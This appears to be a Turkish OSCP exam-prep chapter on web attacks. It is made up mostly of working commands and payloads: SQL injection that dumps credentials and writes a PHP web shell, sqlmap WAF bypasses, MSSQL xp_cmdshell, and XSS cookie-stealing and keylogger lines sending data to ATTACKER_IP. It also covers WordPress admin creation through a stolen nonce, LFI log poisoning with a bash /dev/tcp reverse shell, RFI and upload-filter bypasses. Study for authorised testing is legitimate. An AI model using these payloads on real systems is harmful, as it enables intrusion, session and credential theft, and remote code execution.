---
layout: page
title: "Bölüm 2 — Web Saldırıları"
oscp: true
toc: true
permalink: /oscp/02-web-saldirilari/
---

{% raw %}
Bu bölüm, web yüzeyinden ilk erişim ve RCE teknikleridir. Akış: keşif → yüzey
taraması (ffuf/dirsearch) → uygulama tespiti (whatweb/wpscan) → enjeksiyon
sınıfı tespiti (SQLi/XSS/LFI/upload/command injection) → sömürme → reverse
shell. Keşif katmanı için önce [Bölüm 1](/oscp/01-enumerasyon/)'i tamamla;
parola saldırılarının geneli [Bölüm 3](/oscp/03-parola-saldirilari/)'tedir.

## 2.1 Kullanışlı Keşif (Web Yüzeyi)

### 2.1.1 Dizin ve dosya taraması — dirsearch / ffuf / gobuster

**Ne:** Web root altındaki gizli dizin, dosya ve uç noktaları bulmak. Her web
engagement'ının ilk adımı; `/cgi-bin`, `/backup`, `/admin`, `/uploads`,
`/.git` gibi kritik yollar burada çıkar.

```bash
# dirsearch — hızlı genel tarama (varsayılan uzantılar)
dirsearch -u http://TARGET/

# Belirli uzantılarla tarama
dirsearch -u http://TARGET/cgi/ -e bat,cmd,sh,pl

# ffuf — çok hızlı; önce default boyutu öğren, sonra filtrele
ffuf -u "http://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

# Uzantılı tarama
ffuf -u "http://TARGET/blog/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -e .php,.bak,.txt,.zip -fs 2287

# Rekürsif tarama
ffuf -w wordlist.txt:FUZZ -u http://TARGET/FUZZ -recursion -recursion-depth 1 -e .php

# gobuster alternatifi
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

**Tuzaklar / notlar:**
- ffuf'ta önce `-fs <boyut>` (veya `-fc`, `-fw`) ile gürültüyü at; filtre yoksa
  çıktı okunmaz. Önce normal bir istek at, dönen boyutu ölç.
- 404 dönen bir dizin (`/cgi`) altında dosya olabilir; her zaman uzantı varyasyonu
  dene (bkz. Tomcat CGI bölümü 2.7.4).
- Aynı dosyayı iki kez yükleme: "file exists" hatası dosya adlarını brute-force
  etmeyi, diğer hatalar teknoloji bilgisini verir.

### 2.1.2 Teknoloji / CMS fingerprint — whatweb

**Ne:** Sitenin kullandığı framework, CMS, sunucu ve versiyon bilgisini çıkarır.
Sonraki saldırı vektörünü belirler (WordPress mi, Joomla mı, .NET mi?).

```bash
# Temel tarama
whatweb http://TARGET/

# Detaylı, çalışma dizini için kaydet
whatweb -v http://TARGET/ | tee whatweb.txt

# Favicon ile framework tespiti (OWASP favicon database)
wget http://TARGET/favicon.ico && md5sum favicon.ico
# md5'i https://wiki.owasp.org/index.php/OWASP_favicon_database ile karşılaştır
```

**Tuzaklar / notlar:**
- favicon md5'ini başka araçla pipe'lamak farklı sonuç verebilir; dosyayı indirip
  doğrudan `md5sum` çalıştır.
- `robots.txt` ve `sitemap.xml` her zaman kontrol edilir; disallowed yollar
  keşif hedefi listesi üretir.
- HTTP `Server` header yanıltıcı olabilir; hata sayfası (`/docs`, 404) ve özel
  header setleri ile doğrula.

### 2.1.3 Parametre ve değer fuzzing — ffuf

**Ne:** Görünür olmayan GET/POST parametrelerini ve ID değerlerini bulmak.
Sitenin cookie tutmadığı veya "unauthorized access" verdiği durumlarda gizli
parametre fuzzing'i ilk adaydır.

```bash
# GET parametre fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://TARGET/admin.php?FUZZ=key' -fs 2287

# POST parametre fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://TARGET/admin.php' -X POST -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs 798

# Burp isteğinden fuzzing (istekte ?id=5 değerini FUZZ ile değiştir)
ffuf -request req.txt -u "http://TARGET/admin.php" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 798

# ID değeri fuzzing (IDOR için)
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u 'http://TARGET/admin.php' -X POST -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs 798
```

**Tuzaklar / notlar:**
- Parametre bulunca hemen değer varyasyonu dene (`id=1..N`); IDOR ve gizli
  admin fonksiyonları (bkz. 2.8.2) burada yakalanır.
- VHost fuzzing: `ffuf -u http://TARGET/ -H 'Host: FUZZ.site.lab' -fs xxx`
  ile sanal host keşfi yapılır (bkz. [Bölüm 1](/oscp/01-enumerasyon/)).

## 2.2 SQL Injection

### 2.2.1 Manuel tespit ve temel sömürme

**Ne:** Kullanıcı girdisinin SQL sorgusuna filtresiz girdiği durumlarda veritabanı
okuma/yazma/komut çalıştırma. GET/POST parametrelerinde tek tırnak (`'`) ile
hata veya davranış farkı ara.

```bash
# Tespit — hata tabanlı
curl -s "http://TARGET/page.php?id=1'"          # SQL hatası mı?
curl -s "http://TARGET/page.php?id=1' OR 1=1-- -" # Farklı yanıt mı?

# Boolean tabanlı blind
curl -s "http://TARGET/blind.php?user=offsec' AND 1=1-- -"
curl -s "http://TARGET/blind.php?user=offsec' AND 1=2-- -"

# Time tabanlı blind
curl -s "http://TARGET/blind.php?user=offsec' AND IF(1=1, sleep(3), 'false')-- -"
```

UNION saldırısı — sütun sayısını `ORDER BY` veya `UNION SELECT 1,2,3...` ile bul:

```sql
' order by 1-- -
' order by 2-- -
cn' UNION SELECT 1,2,3-- -
cn' UNION SELECT 1,@@version,3,4-- -
```

Enumeration (MySQL):

```sql
-- Veritabanları
cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
-- Tablolar
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
-- Sütunlar
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
-- Veri (DB.table nokta notasyonu!)
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
-- Çıktı tek satırsa: tüm satırları tek satırda topla
cn' UNION SELECT group_concat(id,":",username,":",password,'<br>'),user(),3 FROM staff_users-- -
-- Tek satır çıktıda LIMIT/OFFSET ile kaydırma
cn' UNION SELECT column_name,column_type,database() FROM INFORMATION_SCHEMA.columns WHERE table_name='staff_users' LIMIT 1 OFFSET 1-- -
```

**Tuzaklar / notlar:**
- MySQL'de `-- ` sonrasında boşluk zorunlu; URL'de `--+` veya `-- -` yaz. `#`
  URL'de tag sayılır → `%23`.
- Sorgu parantezliyse payload `')-- -` olmalı (örn. `WHERE (username='...')`).
- Blind'te tek satır çıkıyorsa `substring()` / `LIKE 'a%'` ile karakter
  karakter sızdır; tablo şeması `information_schema.COLUMNS` üzerinden
  `COLUMN_NAME like 'a%'` ile kazınır.
- IIS sunucu görürsen DBMS büyük ihtimalle MSSQL; Apache/Nginx → MySQL.
  Kesin fingerprint: `@@version`, `SELECT POW(1,1)` (sadece MySQL 1 döner),
  `SELECT SLEEP(5)` (blind).
- MySQL'e uzaktan bağlanırken SSL hatası alırsan:
  `mysql -u <KULLANICI> -p'<PAROLA>' -h TARGET -P 3306 --ssl=False`
  (`-p` ile parola arasında boşluk YOK).

### 2.2.2 Dosya okuma/yazma ve web shell (MySQL)

**Ne:** `FILE` privilege varsa `LOAD_FILE` ile okuma, `INTO OUTFILE` ile yazma.
Web root'a shell yazmak RCE'ye giden en kısa yol.

```sql
-- Privilege kontrolü
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<KULLANICI>"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

-- Dosya okuma
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -  -- kaynak kod!

-- secure_file_priv kontrolü (boş olmalı; dolu/NULL ise yazma kapalı)
SELECT variable_name, variable_value FROM information_schema.global_variables
  WHERE variable_name="secure_file_priv"

-- Web shell yazma (NULL ile sütun kalabalığını önle)
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

```bash
# Shell çağrısı
curl -s "http://TARGET/shell.php?0=id"

# Web root bilinmiyorsa: config oku veya SecLists ile fuzz'la
# /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
# Apache: /etc/apache2/apache2.conf   Nginx: /etc/nginx/nginx.conf
# IIS: %WinDir%\System32\Inetsrv\Config\ApplicationHost.config
```

**Tuzaklar / notlar:**
- Dosya okuma/yazma için 3 koşul: `FILE` privilege + `secure_file_priv` boş +
  hedef dizine yazma yetkisi. üçünü de doğrula.
- Okunan OS kullanıcısı (mysql kullanıcısı) dosyayı okuyabilmeli.
- Uzun/binary dosya yazacaksan `FROM_BASE64(...)` ile yaz; `""` kullan ki
  UNION'un tüm sütunları dosyaya düşmesin (1,3,4 gibi sayılar dosyaya gider).

### 2.2.3 sqlmap — otomasyon ve bypass'lar

**Ne:** SQLi'yi otomatik tespit, dump ve OS shell. Manuelden hızlı; ama WAF ve
CSRF token'ları için ek parametre gerekir.

```bash
# Temel tarama
sqlmap -u "http://TARGET/vuln.php?id=1" --batch

# Burp isteği ile (-r req.txt); enjekte edilecek parametreyi * ile işaretle: id=1*
sqlmap -r req.txt -p item --batch
sqlmap -r req.txt --batch --dump

# Teknik seçimi (BEUSTQ: Boolean, Error, Union, Stacked, Time, inline)
sqlmap -u "http://TARGET/?id=1" --technique=BEU --batch

# Bilgi toplama
sqlmap -u "http://TARGET/?id=1" --banner --current-user --current-db --is-dba
sqlmap -u "http://TARGET/?id=1" --tables -D <VERITABANI>
sqlmap -u "http://TARGET/?id=1" --dump -T <TABLO> -D <VERITABANI>
sqlmap -u "http://TARGET/?id=1" --dump -T <TABLO> -D <VERITABANI> -C user,pass
sqlmap -u "http://TARGET/?id=1" --dump-all --exclude-sysdbs   # tüm DB'ler
sqlmap -u "http://TARGET/?id=1" --schema                     # tüm şema tek seferde
sqlmap -u "http://TARGET/?id=1" --where="name LIKE 'f%'" --dump -T users -D testdb
sqlmap -u "http://TARGET/?id=1" --search -C style            # sütun adı ara

# UNION tuning — sütun sayısını biliyorsan ver
sqlmap -u "http://TARGET/?id=1" --union-cols=5 --dump --no-cast

# OS seviyesi
sqlmap -u "http://TARGET/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://TARGET/?id=1" --os-shell --web-root "/var/www/html/tmp"  # web root biliniyorsa
sqlmap -r req.txt --os-shell
```

**Tuzaklar / notlar:**
- `--os-shell` çıktı vermiyorsa `--technique=E` (error-based) dene; UNION
  shell'inin çalışmadığı durumlarda error-based direkt çıktı döner.
- WAF/ blacklist bypass:
  - `--random-agent` (sqlmap UA'sı kara listedeyse),
  - `--tamper=between,randomcase` (tamper listesi: `--list-tampers`),
  - `--chunked` (anahtar kelimeler chunk'lar arasına bölünür),
  - HPP: parametreler aynı isimle parçalanır (`?id=1&id=UNION&id=SELECT...`).
- CSRF token'ı varsa `--csrf-token="<param_adı>"` — sqlmap her istekte sayfayı
  parse edip yeni token alır. Benzersiz değer isteyen parametrelerde
  `--randomize=rp`; hesaplanan değerlerde
  `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`.
- Cookie ile session gerekiyorsa Burp'den "Copy as curl" → curl kısmını sqlmap
  `-u` yerine yapıştır, `curl` kelimesini sil.
- `-r req.txt` kullanırken enjeksiyon noktasını `id=1*` olarak işaretle
  (`id=*` değil).

### 2.2.4 MSSQL — xp_cmdshell

**Ne:** Windows/IIS + MSSQL ortamında DB üzerinden OS komutu. SQLi ile veya
doğrudan kimlik bilgisiyle `impacket-mssqlclient` ile açılır.

```bash
# Doğrudan bağlantı (Windows auth)
impacket-mssqlclient <KULLANICI>:<PAROLA>@TARGET -windows-auth
```

```sql
-- xp_cmdshell etkinleştir (admin yetki gerektirir)
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Komut çalıştır
EXECUTE xp_cmdshell 'whoami';
```

**Tuzaklar / notlar:**
- sqlmap da `--os-shell` ile MSSQL'de xp_cmdshell dener; manuel açılış her
  zaman yedeğe tut.
- Yetki yetersizse (DB kullanıcısı sysadmin değilse) önce yetki yükseltme
  adaylarını kontrol et (bkz. [Bölüm 5](/oscp/05-linux-privesc/) /
  [Bölüm 4](/oscp/04-windows-privesc/)).

## 2.3 XSS (Cross-Site Scripting)

### 2.3.1 Tespit ve temel payload'lar

**Ne:** Girdinin filtresiz sayfaya yansıtılması. Reflected (linkte taşınır),
Stored (kalıcı, en değerlisi), DOM (sunucuya istek gitmez — arka planda
sorgu dönmüyorsa DOM XSS düşün).

```html
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>     <!-- <script> engelli DOM'da -->
<plaintext>                                    <!-- render'ı durdurur -->
<script>print()</script>                      <!-- print dialog, engellenmez -->
```

DOM XSS ipucu: URL'de `#` sonrası parametre varsa tamamen client-side'dır;
`innerHTML` kullanan kodda `<script>` çalışmaz ama `<img onerror>` çalışır.

**Kaçış kalıpları:**
```html
"></textarea><script>alert(1)</script>         <!-- textarea içindeyse önce kapat -->
';alert('THM');//                              <!-- JS string içindeyse -->
ScrIpT                                        <!-- case-filtre bypass -->
```

**Tuzaklar / notlar:**
- Modern siteler input'u cross-domain iframe'de işler; `window.origin` alert'i
  hangi formun zayıf olduğunu gösterir.
- Email alanı genelde hem front hem back-end'de format-validasyonludur — atla;
  parola alanı hash'lenir — atla. Test alanını daralt.
- Kaynak kodu incele (kodu değiştirip diff at); filtre mantığını gör, payload'ı
  ona göre üret.

### 2.3.2 Cookie theft ve session hijacking

**Ne:** Cookie'de `HttpOnly` yoksa `document.cookie` çalınır; çalınan session
cookie ile kurbanın oturumuna bineriz. Secure olmayan cookie ağdan da düşer.

```javascript
// Hafif dinleyici yakala (cookie'yi GET ile geri gönder)
new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
```

```php
<?php
// index.php — birden fazla cookie için; cookies.txt'ye yazar
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
sudo php -S 0.0.0.0:80        # dinleyici (dosya adı index.php olmalı!)
nc -lvnp 80                   # alternatif ham dinleyici
```

**Tuzaklar / notlar:**
- Çalınan cookie'yi kullanırken **hem name hem value** eksiksiz gönder;
  `Secure` cookie'yi yalnızca HTTPS üzerinden gönder.
- `HttpOnly` olan session cookie çalınmaz; o zaman keylogger veya DOM
  üzerinden eylem çalma kullan:
  `<script>document.onkeypress=function(e){fetch('http://ATTACKER_IP/k?key='+btoa(e.key))}</script>`
- Çalınan oturumun izleri ve ikincil doğrulama (IP/UA) sınav kanıtında not edilir.

### 2.3.3 Blind XSS ve otomasyon — XSStrike

**Ne:** Yüklenen payload'ın yansıması görünmüyorsa (ör. kayıt formu arka planda
işlenir) blind XSS: uzaktan script çağırıp istek üzerinden zafiyeti teyit et.
Kurumsal hedefler için xsshunter-express; hızlı tarama için XSStrike.

```bash
# Dinleyici
mkdir /tmp/xss && cd /tmp/xss && sudo php -S 0.0.0.0:8181

# Her input alanına alan adıyla payload — gelen istek hangi alanın zayıf olduğunu söyler
<script src=http://ATTACKER_IP/username></script>
"><script src=http://ATTACKER_IP/fullname></script>

# XSStrike
python xsstrike.py -u "http://TARGET/index.php?task=test"
python xsstrike.py -u "http://TARGET/faq.php" --data '{"search":"q"}' --json
python xsstrike.py -u "http://TARGET/" --crawl -l 3        # tarama derinliği
python xsstrike.py -u "http://TARGET/x.php" --path         # path tabanlı XSS
python xsstrike.py -u "http://TARGET/x.php" --data "comment=test" \
  --proxy --headers "Cookie: <SESSION_COOKIE>"             # POST + proxy + header
```

**Tuzaklar / notlar:**
- XSStrike `--headers /tmp/req.txt` bazı header'ları yutar; önemli header'ları
  ayrıca `--headers "..."` olarak ver.
- Blind XSS payload listesi (PayloadsAllTheThings): `eval` tabanlı, `$.getScript`
  tabanlı varyantlar engel durumuna göre dönüşür.
- İstek dinleyiciye düşmediyse sıradaki payload'a geç; alan adını payload
  sonuna ekle ki hangi alanın tetiklendiği belli olsun.

### 2.3.4 WordPress nonce ile admin oluşturma (stored XSS zinciri)

**Ne:** WordPress'te XSS admin oturumunda çalışıyorsa, nonce (CSRF token
muadili) çalınıp `user-new.php` üzerinden yeni admin açılır. Tek adımda
privilege escalation.

```javascript
// 1) Nonce çal (kurbanın oturumunda çalışır)
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// 2) Yeni admin oluştur
var params = "action=createuser&_wpnonce_create-user="+nonce+
  "&user_login=<YENI_KULLANICI>&email=<MAIL>&pass1=<PAROLA>&pass2=<PAROLA>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Tuzaklar / notlar:**
- Payload'ı tek satıra indir (JS minifier), ardından karakter kodlarına çevir:
  `output += input.charCodeAt(pos)` ile `String.fromCharCode(...)` için
  virgüllü liste üret.
- Admin hesabı açıldıktan sonra plugin editörü veya basit bir PHP shell yükleyip
  media dizininden çalıştır (bkz. 2.7.1).

## 2.4 LFI / Path Traversal

### 2.4.1 Dizin gezintisi (Path Traversal)

**Ne:** Dosya yolu alan parametrelerde `../` ile web root dışına çıkıp hassas
dosya okuma. Parametre adı: `file`, `page`, `language`, `include`, `doc`...

```bash
# Linux
curl -s "http://TARGET/get.php?file=../../../../etc/passwd"
# Windows — hem / hem \ dene (RFC 1738 / ister ama uygulama farklı davranabilir)
curl -s "http://TARGET/get.php?file=..\..\..\..\windows\win.ini"
# Bazen yalnızca noktalar encode edilmeli
curl -s "http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords"
```

Filtre bypass'ları:

```text
../ ../  → %2e%2e%2f (URL encode), %252e%252e%252f (double encode)
../ silen tekil filtre (str_replace): ....//  veya ..././  → kalan ../
Onaylı dizin kısıtı (./languages/ şartı): ./languages/../../../../etc/passwd
Uzun path truncasyonu (PHP < 7): 4096 karakter + ./... dizisi → eklenen .php budanır
Null byte (PHP < 5.3.4): /etc/passwd%00   # sonraki ".php" görülmez
```

**Tuzaklar / notlar:**
- URL encoder'lar `.` karakterini encode etmez; CyberChef / Burp Decoder ile
  elle encode et.
- Hedef Windows ise `\` varyantını asla atlama; bazı uygulamalar yalnızca
  backslash ile zayıftır.
- Okunacak dosya adayları: `/etc/passwd`, `/etc/issue`, `/proc/version`,
  `~/.bash_history`, `/root/.ssh/id_rsa`, log dosyaları (2.4.2),
  `C:\boot.ini`, `C:\windows\win.ini`.

### 2.4.2 LFI ile log poisoning → RCE

**Ne:** LFI ile okunabilen bir log'a (User-Agent, PHP session) PHP kodu
enjekte edip logu include ederek komut çalıştırma.

```bash
# 1) Logları oku — hangisi okunabiliyor?
curl -s "http://TARGET/index.php?language=../../../../var/log/apache2/access.log"
curl -s "http://TARGET/index.php?language=../../../../var/log/nginx/access.log"
# Windows Apache: C:\xampp\apache\logs\   Nginx Win: C:\nginx\log\

# 2) User-Agent'a PHP enjekte et (Burp ile User-Agent değiştir; çift tırnak patlatır, tek kullan!)
curl -s -A "<?php echo system(\$_GET['cmd']); ?>" "http://TARGET/"

# 3) Logu include edip komut çalıştır — GET ile & ile sorgula, tüm özel karakterleri encode et
curl -s "http://TARGET/index.php?language=../../../../var/log/apache2/access.log&cmd=ps"

# 4) Reverse shell
curl -s "http://TARGET/index.php?language=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F1234%200%3E%261%27"
```

**Diğer zehirlenebilir dosyalar:**
- PHP session poisoning: `PHPSESSID` cookie değeri `sess_` önekiyle
  `/var/lib/php/sessions/` (Win: `C:\Windows\Temp\`) altında dosyadır.
  `?language=session_poisoning` gibi değerlerle kontrol edilebilen alanı
  `<?php system($_GET["cmd"]); ?>` yap, sonra session dosyasını include et.
  (Her çalıştırmadan önce payload'ı yeniden yükle.)
- Process dosyaları: `/proc/self/environ`, `/proc/self/fd/N` (N=0-50).
- Servis logları: `/var/log/sshd.log`, `/var/log/vsftpd.log`,
  `/var/log/mail` (mail formatı: `/var/mail/<KULLANICI>`,
  `~/Maildir/`).

**Tuzaklar / notlar:**
- Nginx logları düşük yetkili kullanıcıya okunur; Apache logları genelde
  root/adm grubuna kapalıdır — eski veya yanlış yapılandırılmış Apache'de açıktır.
- Log konumu bilinmiyorsa SecLists LFI wordlist'i ile fuzz'la:
  `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://TARGET/index.php?language=FUZZ' -fs <boyut>`
- Mail logları önce salt okunur test edilir; okunabiliyorsa SMTP üzerinden
  log zehirleme yapılır.

### 2.4.3 PHP wrapper'ları ve source code disclosure

**Ne:** `php://` wrapper'ları ile filtre bypass, kod okuma ve RCE.

```bash
# Kaynak kod okuma (render edilmeyen PHP'yi base64 ile al)
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=config"
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# php.ini'de allow_url_include=On görülüyorsa → data:// ile RCE
echo '<?php system($_GET["cmd"]); ?>' | base64
# base64 çıktısını BİR DE URL-ENCODE ET, sonra:
curl -s "http://TARGET/index.php?language=data://text/plain;base64,<URL_ENCODED_B64>&cmd=id"

# php://input ile RCE (POST verisi olarak shell; parametre POST kabul etmeli)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id"

# expect:// wrapper (expect extension kuruluysa — php.ini'de kontrol et)
curl -s "http://TARGET/index.php?language=expect://id"
```

**Tuzaklar / notlar:**
- `php.ini` okumak için base64 filtresi şart (ini de render edilmez). Apache:
  `/etc/php/X.Y/apache2/php.ini`, Nginx (fpm): `/etc/php/X.Y/fpm/php.ini`.
- `allow_url_include` default kapalıdır; açık bulursan data/input/RFI yolu açılır.
- expect kurulu mu: php.ini base64 decode edip `grep expect`.

### 2.4.4 RFI (Remote File Inclusion)

**Ne:** `allow_url_include=On` ise uzaktan shell include edilir. Windows hedefte
SMB/UNC yolu `allow_url_include`'a gerek duymaz.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 8000          # HTTP ile host'la

# Sömür
curl -s "http://TARGET/index.php?language=http://ATTACKER_IP:8000/shell.php&cmd=id"

# FTP alternatifi (HTTP engelliyse)
sudo python -m pyftpdlib -p 21

# Windows hedef → SMB/UNC (allow_url_include GEREKMEZ)
impacket-smbserver -smb2support share $(pwd)
# include: http://TARGET/index.php?language=\\\\ATTACKER_IP\\share\\shell.php&cmd=whoami
```

**Tuzaklar / notlar:**
- Fonksiyon tablosu: `include/require` okur VE çalıştırır (require remote URL
  kabul etmez); `file_get_contents/fopen` okur, çalıştırmaz — önce hangi
  fonksiyonun kullanıldığını anla (davranıştan: kod mu basılıyor, yoksa içerik mi?).
- ASP hedef: `<% eval request('cmd') %>` payload'ını uzaktan host'la.
- `allow_url_fopen` RFI için ön koşuldur; kapalıysa LFI/log poisoning'e dön.

### 2.4.5 Upload + LFI zincirleri

**Ne:** Upload yalnızca "zararsız" türde dosyaya izin veriyor ama LFI varsa
yüklenen dosyayı include edip RCE yapılır.

```bash
# Zararsız görünümlü PHP'li GIF (magic byte + .gif uzantısı)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Yükle, sonra: http://TARGET/index.php?language=./profile_images/shell.gif&cmd=id

# zip:// wrapper (zip upload'a izinliyse)
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# include: http://TARGET/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

# phar:// wrapper
cat > mkphar.php <<'EOF'
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
EOF
php --define phar.readonly=0 mkphar.php && mv shell.phar shell.jpg
# include: http://TARGET/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**Tuzaklar / notlar:**
- GIF8 ASCII olduğu için en kolay taklit edilen magic byte'tır; diğer türler
  binary magic byte ister (hex editör gerekir).
- phpinfo sayfası açıksa eski teknik (LFI→RCE via phpinfo upload) için
  HackTricks: `pentesting-web/file-inclusion/lfi2rce-via-phpinfo`.

## 2.5 Dosya Yükleme Bypass'ları

### 2.5.1 Genel metodoloji

**Ne:** Upload formundaki istemci/sunucu doğrulamalarını aşıp çalıştırılabilir
dosya yüklemek. Sıralı ilerle:

1. Gerçek bir image yükle; Burp ile uzantısını değiştir — kaydediyor mu?
2. Kaydetmiyorsa sunucuda hangi uzantı execute ediliyorsa onu bul
   (`.php`, `.php5`, `.phtml`, `.phar`...).
3. İçerik filtresi varsa magic byte'ı taklit et; hâlâ reddediyorsa filtre
   magic-byte tabanlıdır → byte'ı değiştir.
4. `Content-Type` header'ını doğru görünen bir değere çevir.

```bash
# Client-side filtre: response'u intercept et, JS doğrulamasını sil;
# veya Burp ayarlarından .js/.png isteklerinin intercept'ini açıp drop et.

# Magic byte taklidi (GIF en kolayı)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
file shell.gif    # GIF image data döner

# Magic byte tabanlı filtrede: dosyaya AAAA yaz, hexeditörle gerçek byte'lara
# çevir (örn. PNG: 89 50 4E 47) — https://en.wikipedia.org/wiki/List_of_file_signatures
```

**Tuzaklar / notlar:**
- Aynı dosyayı iki kez yükleme davranışını mutlaka test et: overwrite izni
  varsa `authorized_keys` veya mevcut sayfanın üzerine yazma (defacement/
  RCE zinciri) açılır.
- Uzunluk filtresi varsa küçük shell kullan (örn. `<?php system($_GET[0]);?>`).
- Dosya uzantısı bypass'ı tek başına yetmez — yükenen dosyanın sunucuda
  gerçekten execute edildiğini doğrula (`?cmd=id` ile).

### 2.5.2 Uzantı bypass'ları — çift uzantı ve karakter enjeksiyonu

**Ne:** Whitelist/blacklist filtreleri uzantı manipülasyonu ile kandırılır.

```bash
# Denenecek karakterler: %20 %0a %00 %0d0a / .\ . … :
# shell.php%00.jpg   → PHP 5.x null-byte truncasyonu
# shell.aspx:.jpg    → Windows (ADS): shell.aspx olarak yazılır
# shell.php.jpg, shell.phtml, shell.php5, shell.phar → çift/alternatif uzantı

# Tüm kombinasyonları üret
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phar' '.php6'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

# Burp Intruder ile yükle; başarılı olanları bul:
#!/bin/bash
while IFS= read -r line; do
    curl -s -o /dev/null -w "%{http_code} $line\n" "http://TARGET/profile_images/$line"
done < wordlist.txt
# 200 dönen = upload edilmiş → ?cmd=id ile execute testi
```

**Tuzaklar / notlar:**
- Upload dizini listelenmiyorsa yükenen dosyanın adını/yolunu tahmin et
  (`profile_images/`, `uploads/`, tarih/dizin pattern'i) ve dirsearch ile doğrula.
- `Content-Type` header'ına SecLists MIME listesiyle brute-force atılabilir.

### 2.5.3 Sınırlı upload'ların suistimali (XSS/SVG/overwrite)

**Ne:** Sadece image yüklenebiliyorsa bile metadata, SVG veya overwrite ile
etki elde edilir.

```bash
# Image metadata'sına XSS (metadata gösteren sayfalarda tetiklenir)
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' resim.jpg

# SVG içine XSS (SVG XML tabanlıdır)
cat > resim.svg <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
EOF
```

**authorized_keys overwrite (shell sonrası kullanım dahil):**

```bash
# Upload traversal ile hedef kullanıcının authorized_keys'inin üzerine yaz
ssh-keygen -f fileup -t ed25519
cat fileup.pub > authorized_keys
# Upload adı: ../../../../../../../root/.ssh/authorized_keys

# Kendi tarafında known_hosts çakışması hatası alırsan (lab IP'leri tekrar kullanılır):
rm ~/.ssh/known_hosts
ssh root@TARGET -p 2222 -i ~/.ssh/fileup
```

**Tuzaklar / notlar:**
- Hangi kullanıcının ana dizinine yazdıysan SSH'ı o kullanıcıya at
  (`root@TARGET`); yanlış kullanıcıya istek anlamsızdır.
- Yetki hatalarında upload'ın hangi OS kullanıcısıyla yazdığını öğren
  (genelde www-data → /home/<kullanici>/ dizini yazılamaz).

## 2.6 Komut Enjeksiyonu

### 2.6.1 Tespit ve temel operatörler

